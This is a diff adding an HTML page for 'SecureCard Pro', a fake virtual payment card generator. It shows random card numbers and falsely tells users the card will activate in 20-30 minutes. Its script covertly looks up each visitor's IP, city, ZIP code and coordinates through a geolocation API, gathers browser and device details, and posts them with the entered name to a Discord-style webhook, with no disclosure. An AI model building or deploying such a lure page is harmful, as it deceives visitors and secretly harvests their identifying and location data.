@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Premium virtual payment card generation platform with secure, customizable card designs.">
+    <title>SecureCard Pro | Virtual Payment Card Solutions</title>
+    <link rel="icon" type="image/png" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Crect width='512' height='512' fill='%231e293b' rx='60'/%3E%3Crect x='80' y='180' width='352' height='50' rx='8' fill='%2338bdf8' opacity='0.9'/%3E%3Crect x='80' y='270' width='220' height='35' rx='6' fill='%2394a3b8' opacity='0.7'/%3E%3Crect x='330' y='260' width='90' height='55' rx='8' fill='%2338bdf8' opacity='0.8'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(rgba(15, 23, 42, 0.75), rgba(15, 23, 42, 0.85)),
+                        url('https://i.pinimg.com/736x/70/2c/9a/702c9a5915c832c438b099656385ffa5.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #e2e8f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 45px;
+            padding: 25px 0;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: #f8fafc;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            color: #94a3b8;
+            font-weight: 400;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 35px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 968px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card-section, .customization-section {
+            background: rgba(30, 41, 59, 0.75);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(148, 163, 184, 0.12);
+            border-radius: 12px;
+            padding: 28px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .section-title {
+            font-size: 1.35rem;
+            font-weight: 500;
+            color: #f1f5f9;
+            margin-bottom: 22px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.15);
+        }
+
+        .card-display {
+            perspective: 1000px;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .credit-card {
+            width: 330px;
+            height: 200px;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.7s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+        }
+
+        .credit-card.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .card-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 10px;
+            padding: 22px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+        }
+
+        .card-front {
+            background: linear-gradient(135deg, #334155 0%, #475569 100%);
+        }
+
+        .card-back {
+            background: linear-gradient(135deg, #475569 0%, #334155 100%);
+            transform: rotateY(180deg);
+        }
+
+        .card-chip {
+            width: 45px;
+            height: 36px;
+            background: linear-gradient(135deg, #e2e8f0 0%, #cbd5e1 100%);
+            border-radius: 5px;
+            margin-bottom: 8px;
+        }
+
+        .card-logo {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #f8fafc;
+            letter-spacing: 2px;
+            text-align: right;
+        }
+
+        .card-number {
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #f8fafc;
+            letter-spacing: 2.5px;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-label {
+            font-size: 0.6rem;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 3px;
+        }
+
+        .card-value {
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #f8fafc;
+            letter-spacing: 0.8px;
+        }
+
+        .magnetic-strip {
+            background: #1e293b;
+            height: 42px;
+            margin: 18px 0;
+            border-radius: 3px;
+        }
+
+        .cvv-box {
+            background: rgba(248, 250, 252, 0.9);
+            padding: 7px 11px;
+            border-radius: 4px;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        .cvv-label {
+            font-size: 0.5rem;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .cvv-value {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #0f172a;
+            letter-spacing: 1.5px;
+        }
+
+        .flip-instruction {
+            text-align: center;
+            color: #64748b;
+            font-size: 0.8rem;
+            margin-top: 12px;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+            letter-spacing: 0.3px;
+        }
+
+        input[type="text"],
+        input[type="color"],
+        input[type="url"],
+        select {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(148, 163, 184, 0.2);
+            border-radius: 8px;
+            color: #f1f5f9;
+            font-size: 0.95rem;
+            transition: all 0.25s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="url"]:focus,
+        select:focus {
+            outline: none;
+            border-color: #38bdf8;
+            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.1);
+        }
+
+        input[type="color"] {
+            height: 45px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        input[type="text"]::placeholder {
+            color: #64748b;
+        }
+
+        input.error {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+        }
+
+        .error-message {
+            color: #ef4444;
+            font-size: 0.8rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.visible {
+            display: block;
+        }
+
+        .color-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-generate {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #f8fafc;
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-generate:hover:not(:disabled) {
+            border-color: #38bdf8;
+            box-shadow: 0 6px 16px rgba(56, 189, 248, 0.15);
+            transform: translateY(-1px);
+        }
+
+        .btn-generate:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-generate:disabled {
+            background: #334155;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+            border-color: transparent;
+            opacity: 0.7;
+        }
+
+        .timer-display {
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(148, 163, 184, 0.12);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 18px;
+            text-align: center;
+            display: none;
+        }
+
+        .timer-display.visible {
+            display: block;
+        }
+
+        .timer-label {
+            color: #94a3b8;
+            font-size: 0.85rem;
+            margin-bottom: 5px;
+        }
+
+        .timer-value {
+            color: #f1f5f9;
+            font-size: 1.5rem;
+            font-weight: 600;
+            font-family: 'Courier New', monospace;
+        }
+
+        .info-display {
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(148, 163, 184, 0.12);
+            border-radius: 8px;
+            padding: 18px;
+            margin-top: 22px;
+            display: none;
+        }
+
+        .info-display.visible {
+            display: block;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.08);
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #94a3b8;
+            font-size: 0.85rem;
+        }
+
+        .info-value {
+            color: #f1f5f9;
+            font-weight: 400;
+            font-size: 0.9rem;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #64748b;
+            font-size: 0.8rem;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(248, 250, 252, 0.2);
+            border-top-color: #f8fafc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            background: rgba(56, 189, 248, 0.1);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            color: #38bdf8;
+            padding: 14px;
+            border-radius: 8px;
+            margin-top: 18px;
+            display: none;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 400;
+        }
+
+        .success-message.visible {
+            display: block;
+        }
+    </style>
+<script src="..."></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SecureCard Pro</h1>
+            <p class="subtitle">Virtual Payment Card Generation Platform</p>
+        </header>
+
+        <div class="main-content">
+            <div class="card-section">
+                <h2 class="section-title">Card Preview</h2>
+                
+                <div class="card-display">
+                    <div class="credit-card" id="creditCard" onclick="flipCard()">
+                        <div class="card-face card-front">
+                            <div class="card-chip"></div>
+                            <div class="card-logo">VISA</div>
+                            <div class="card-number" id="cardNumber">#### #### #### ####</div>
+                            <div class="card-details">
+                                <div>
+                                    <div class="card-label">Card Holder</div>
+                                    <div class="card-value" id="cardHolder">YOUR NAME</div>
+                                </div>
+                                <div>
+                                    <div class="card-label">Expires</div>
+                                    <div class="card-value" id="expiryDate">MM/YY</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-face card-back">
+                            <div class="magnetic-strip"></div>
+                            <div class="cvv-box">
+                                <div class="cvv-label">CVV</div>
+                                <div class="cvv-value" id="cvvNumber">***</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <p class="flip-instruction">Click card to flip between front and back</p>
+
+                <div class="info-display" id="infoDisplay">
+                    <div class="info-row">
+                        <span class="info-label">Card Number</span>
+                        <span class="info-value" id="displayCardNumber">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Expiry Date</span>
+                        <span class="info-value" id="displayExpiry">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">CVV</span>
+                        <span class="info-value" id="displayCVV">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Card Type</span>
+                        <span class="info-value" id="displayCardType">-</span>
+                    </div>
+                </div>
+
+                <div class="success-message" id="successMessage">
+                    Card generated successfully. If the card does not work immediately, please allow 20-30 minutes for activation.
+                </div>
+            </div>
+
+            <div class="customization-section">
+                <h2 class="section-title">Card Configuration</h2>
+                
+                <div class="form-group">
+                    <label for="cardHolderName">Card Holder Name</label>
+                    <input type="text" id="cardHolderName" placeholder="Enter card holder name" value="YOUR NAME" maxlength="50">
+                    <div class="error-message" id="nameError">Please enter a valid card holder name (letters only)</div>
+                </div>
+
+                <div class="color-group">
+                    <div class="form-group">
+                        <label for="primaryColor">Primary Color</label>
+                        <input type="color" id="primaryColor" value="#334155">
+                    </div>
+                    <div class="form-group">
+                        <label for="secondaryColor">Secondary Color</label>
+                        <input type="color" id="secondaryColor" value="#475569">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="backgroundImage">Background Image URL (Optional)</label>
+                    <input type="url" id="backgroundImage" placeholder="https://example.com/image.jpg">
+                </div>
+
+                <div class="form-group">
+                    <label for="cardType">Card Type</label>
+                    <select id="cardType">
+                        <option value="VISA">Visa</option>
+                        <option value="MASTERCARD">Mastercard</option>
+                        <option value="AMEX">American Express</option>
+                        <option value="DISCOVER">Discover</option>
+                    </select>
+                </div>
+
+                <button class="btn btn-generate" id="generateBtn" onclick="generateCard()">
+                    Generate Card
+                </button>
+
+                <div class="timer-display" id="timerDisplay">
+                    <div class="timer-label">Time until next card generation</div>
+                    <div class="timer-value" id="timerValue">00:00:00</div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            2026 All Rights Reserved. Legal and Copyright Protection.
+        </footer>
+    </div>
+
+    <script>
+        const webhookURL = '';
+        const COOLDOWN_HOURS = 24;
+        const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;
+        
+        let isFlipped = false;
+        let timerInterval = null;
+
+        function flipCard() {
+            const card = document.getElementById('creditCard');
+            isFlipped = !isFlipped;
+            card.classList.toggle('flipped');
+        }
+
+        function validateCardHolderName(name) {
+            const namePattern = /^[A-Za-z\s\-']{2,50}$/;
+            return namePattern.test(name.trim());
+        }
+
+        function updateCardPreview() {
+            const cardHolder = document.getElementById('cardHolderName').value || 'YOUR NAME';
+            const primaryColor = document.getElementById('primaryColor').value;
+            const secondaryColor = document.getElementById('secondaryColor').value;
+            const backgroundImage = document.getElementById('backgroundImage').value;
+            const cardType = document.getElementById('cardType').value;
+
+            document.getElementById('cardHolder').textContent = cardHolder.toUpperCase();
+            document.querySelector('.card-logo').textContent = cardType;
+
+            const cardFront = document.querySelector('.card-front');
+            const cardBack = document.querySelector('.card-back');
+
+            if (backgroundImage) {
+                cardFront.style.background = `linear-gradient(135deg, ${primaryColor}cc 0%, ${secondaryColor}cc 100%), url('${backgroundImage}')`;
+                cardFront.style.backgroundSize = 'cover';
+                cardFront.style.backgroundPosition = 'center';
+                cardBack.style.background = `linear-gradient(135deg, ${secondaryColor}cc 0%, ${primaryColor}cc 100%), url('${backgroundImage}')`;
+                cardBack.style.backgroundSize = 'cover';
+                cardBack.style.backgroundPosition = 'center';
+            } else {
+                cardFront.style.background = `linear-gradient(135deg, ${primaryColor} 0%, ${secondaryColor} 100%)`;
+                cardBack.style.background = `linear-gradient(135deg, ${secondaryColor} 0%, ${primaryColor} 100%)`;
+            }
+        }
+
+        function generateRandomCardNumber() {
+            const cardType = document.getElementById('cardType').value;
+            let prefix, length;
+
+            switch(cardType) {
+                case 'VISA':
+                    prefix = '4';
+                    length = 16;
+                    break;
+                case 'MASTERCARD':
+                    prefix = '5';
+                    length = 16;
+                    break;
+                case 'AMEX':
+                    prefix = '34';
+                    length = 15;
+                    break;
+                case 'DISCOVER':
+                    prefix = '6011';
+                    length = 16;
+                    break;
+                default:
+                    prefix = '4';
+                    length = 16;
+            }
+
+            let cardNumber = prefix;
+            while (cardNumber.length < length) {
+                cardNumber += Math.floor(Math.random() * 10);
+            }
+
+            return formatCardNumber(cardNumber);
+        }
+
+        function formatCardNumber(number) {
+            return number.replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        function generateCVV() {
+            return Math.floor(100 + Math.random() * 900).toString();
+        }
+
+        function generateExpiryDate() {
+            const currentDate = new Date();
+            const year = currentDate.getFullYear() + Math.floor(Math.random() * 5) + 1;
+            const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+            return `${month}/${year.toString().slice(-2)}`;
+        }
+
+        async function getLocationInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    state: data.region || 'Unknown',
+                    zip: data.postal || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    latitude: data.latitude || 'Unknown',
+                    longitude: data.longitude || 'Unknown'
+                };
+            } catch (error) {
+                return {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    state: 'Unknown',
+                    zip: 'Unknown',
+                    country: 'Unknown',
+                    latitude: 'Unknown',
+                    longitude: 'Unknown'
+                };
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+            else if (ua.indexOf('Edge') > -1) browser = 'Edge';
+
+            let os = 'Unknown';
+            if (ua.indexOf('Win') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('iOS') > -1) os = 'iOS';
+
+            return {
+                browser: browser,
+                os: os,
+                userAgent: ua.substring(0, 100) + '...',
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language
+            };
+        }
+
+        function getCurrentDateTime() {
+            const now = new Date();
+            return {
+                date: now.toLocaleDateString(),
+                time: now.toLocaleTimeString(),
+                timestamp: now.toISOString(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        async function sendToWebhook(cardData) {
+            const embed = {
+                title: 'Virtual Card Generated',
+                color: 5610867,
+                fields: [
+                    {
+                        name: 'Card Number',
+                        value: cardData.number,
+                        inline: false
+                    },
+                    {
+                        name: 'Card Type',
+                        value: cardData.type,
+                        inline: true
+                    },
+                    {
+                        name: 'Expiry Date',
+                        value: cardData.expiry,
+                        inline: true
+                    },
+                    {
+                        name: 'CVV',
+                        value: cardData.cvv,
+                        inline: true
+                    },
+                    {
+                        name: 'Card Holder',
+                        value: cardData.holder,
+                        inline: false
+                    },
+                    {
+                        name: 'IP Address',
+                        value: cardData.location.ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Location',
+                        value: `${cardData.location.city}, ${cardData.location.state}, ${cardData.location.zip}`,
+                        inline: true
+                    },
+                    {
+                        name: 'Country',
+                        value: cardData.location.country,
+                        inline: true
+                    },
+                    {
+                        name: 'Coordinates',
+                        value: `${cardData.location.latitude}, ${cardData.location.longitude}`,
+                        inline: true
+                    },
+                    {
+                        name: 'Date',
+                        value: cardData.dateTime.date,
+                        inline: true
+                    },
+                    {
+                        name: 'Time',
+                        value: cardData.dateTime.time,
+                        inline: true
+                    },
+                    {
+                        name: 'Timezone',
+                        value: cardData.dateTime.timezone,
+                        inline: true
+                    },
+                    {
+                        name: 'Browser',
+                        value: cardData.device.browser,
+                        inline: true
+                    },
+                    {
+                        name: 'OS',
+                        value: cardData.device.os,
+                        inline: true
+                    },
+                    {
+                        name: 'Screen Resolution',
+                        value: cardData.device.screenResolution,
+                        inline: true
+                    },
+                    {
+                        name: 'Language',
+                        value: cardData.device.language,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'SecureCard Pro',
+                    timestamp: cardData.dateTime.timestamp
+                }
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+                if (!response.ok) {
+                    console.error('Webhook error:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending webhook:', error);
+            }
+        }
+
+        function formatTime(ms) {
+            const hours = Math.floor(ms / (1000 * 60 * 60));
+            const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((ms % (1000 * 60)) / 1000);
+            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        }
+
+        function startTimer(expiryTime) {
+            const btn = document.getElementById('generateBtn');
+            const timerDisplay = document.getElementById('timerDisplay');
+            const timerValue = document.getElementById('timerValue');
+
+            btn.disabled = true;
+            timerDisplay.classList.add('visible');
+
+            function updateTimer() {
+                const now = Date.now();
+                const remaining = expiryTime - now;
+
+                if (remaining <= 0) {
+                    clearInterval(timerInterval);
+                    btn.disabled = false;
+                    timerDisplay.classList.remove('visible');
+                    localStorage.removeItem('lastGenerationTime');
+                    return;
+                }
+
+                timerValue.textContent = formatTime(remaining);
+            }
+
+            updateTimer();
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        function checkCooldown() {
+            const lastGeneration = localStorage.getItem('lastGenerationTime');
+            if (lastGeneration) {
+                const expiryTime = parseInt(lastGeneration) + COOLDOWN_MS;
+                const now = Date.now();
+
+                if (now < expiryTime) {
+                    startTimer(expiryTime);
+                } else {
+                    localStorage.removeItem('lastGenerationTime');
+                }
+            }
+        }
+
+        async function generateCard() {
+            const cardHolderInput = document.getElementById('cardHolderName');
+            const nameError = document.getElementById('nameError');
+            const cardHolderName = cardHolderInput.value.trim();
+
+            if (!validateCardHolderName(cardHolderName) || cardHolderName === 'YOUR NAME') {
+                cardHolderInput.classList.add('error');
+                nameError.classList.add('visible');
+                return;
+            }
+
+            cardHolderInput.classList.remove('error');
+            nameError.classList.remove('visible');
+
+            const btn = document.getElementById('generateBtn');
+            const originalText = btn.innerHTML;
+            
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span>Processing...';
+
+            const cardNumber = generateRandomCardNumber();
+            const cvv = generateCVV();
+            const expiryDate = generateExpiryDate();
+            const cardType = document.getElementById('cardType').value;
+
+            document.getElementById('cardNumber').textContent = cardNumber;
+            document.getElementById('expiryDate').textContent = expiryDate;
+            document.getElementById('cvvNumber').textContent = cvv;
+
+            document.getElementById('displayCardNumber').textContent = cardNumber;
+            document.getElementById('displayExpiry').textContent = expiryDate;
+            document.getElementById('displayCVV').textContent = cvv;
+            document.getElementById('displayCardType').textContent = cardType;
+
+            const locationInfo = await getLocationInfo();
+            const deviceInfo = getDeviceInfo();
+            const dateTimeInfo = getCurrentDateTime();
+
+            const cardData = {
+                number: cardNumber,
+                type: cardType,
+                expiry: expiryDate,
+                cvv: cvv,
+                holder: cardHolderName.toUpperCase(),
+                location: locationInfo,
+                device: deviceInfo,
+                dateTime: dateTimeInfo
+            };
+
+            await sendToWebhook(cardData);
+
+            localStorage.setItem('lastGenerationTime', Date.now().toString());
+            startTimer(Date.now() + COOLDOWN_MS);
+
+            btn.innerHTML = originalText;
+
+            document.getElementById('infoDisplay').classList.add('visible');
+            document.getElementById('successMessage').classList.add('visible');
+        }
+
+        document.getElementById('cardHolderName').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^A-Za-z\s\-']/g, '');
+            if (this.classList.contains('error')) {
+                this.classList.remove('error');
+                document.getElementById('nameError').classList.remove('visible');
+            }
+            updateCardPreview();
+        });
+
+        document.getElementById('primaryColor').addEventListener('input', updateCardPreview);
+        document.getElementById('secondaryColor').addEventListener('input', updateCardPreview);
+        document.getElementById('backgroundImage').addEventListener('input', updateCardPreview);
+        document.getElementById('cardType').addEventListener('change', updateCardPreview);
+
+        window.addEventListener('load', checkCooldown);
+        updateCardPreview();
+    </script>
+</body>
+</html>
